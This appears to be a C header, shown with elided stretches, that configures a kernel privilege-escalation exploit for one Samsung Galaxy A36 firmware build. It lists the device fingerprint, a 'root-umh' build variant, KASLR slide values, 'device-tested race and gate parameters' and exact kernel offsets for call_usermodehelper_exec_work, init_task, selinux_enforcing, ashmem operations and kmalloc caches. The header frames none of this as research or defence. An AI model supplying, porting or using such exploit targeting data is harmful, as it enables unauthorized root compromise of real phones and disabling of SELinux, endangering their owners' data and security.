...
#define BUILD_VARIANT_LABEL "a36xq-A366BXXSBCZG1-app-p0-baseline"
...
#else
#define BUILD_VARIANT_LABEL "a36xq-A366BXXSBCZG1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a36xqcs/a36xq:15/AP3A.240905.015.A2/A366BXXSBCZG1:user/release-keys"
#endif
...
#define SLIDE_TRACEFS_EVENT_ID 18
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0006497a8ULL
...
#if defined(APP_PAYLOAD) && APP_PAYLOAD
/* Device-tested A366BXXSBCZG1 race and gate parameters. */
...
#define P0_FINGERPRINT_HEADER \
  "targets/a36xq-A366BXXSBCZG1/p0_fingerprint.h"
#endif
...
/* Exact A366BXXSBCZG1 offsets (extracted from kernel 6.6.98) */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0fa4ULL
#define NOOP_LLSEEK_OFF 0x003a4be8ULL          /* keep from template */
#define COPY_SPLICE_READ_OFF 0x003f1798ULL     /* keep */
#define CONFIGFS_READ_ITER_OFF 0x0046ccc0ULL   /* keep */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046d1ecULL /* keep */
#define ASHMEM_IOCTL_OFF 0x00d60b8cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c9d12cULL  /* keep */
#define ASHMEM_MMAP_OFF 0x00c9d180ULL          /* keep */
#define ASHMEM_OPEN_OFF 0x00c9d3a0ULL          /* keep */
#define ASHMEM_RELEASE_OFF 0x00c9d428ULL       /* keep */
#define ASHMEM_SHOW_FDINFO_OFF 0x00c9d4b4ULL   /* keep */
#define ANON_PIPE_BUF_OPS_OFF 0x01167208ULL    /* keep */
#define ASHMEM_FOPS_OFF 0x013132b8ULL          /* keep */
#define KMALLOC_CACHES_OFF 0x01694bb0ULL       /* keep */
#define SYSTEM_UNBOUND_WQ_OFF 0x02109e60ULL    /* keep */
#define INIT_TASK_OFF 0x022de340ULL
#define ASHMEM_MISC_OFF 0x02278aa0ULL          /* keep */
#define ROOT_TASK_GROUP_OFF 0x0230d500ULL      /* keep */
#define SELINUX_ENFORCING_OFF 0x0234ebb0ULL    /* keep (may not exist) */
#define SYSCTL_BOOTID_OFF 0x023f0768ULL        /* keep */

/* Additional computed aliases */
...
/* Slide-related images (using template values, might need adjustment) */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01628198ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02111260ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x022361b0ULL
...
/* P0 fingerprint and slide event ID (our calculated values) */
#define P0_FINGERPRINT_TABLE { 0x015d9520 }
#define SLIDE_EVENT_ID SLIDE_TRACEFS_EVENT_ID
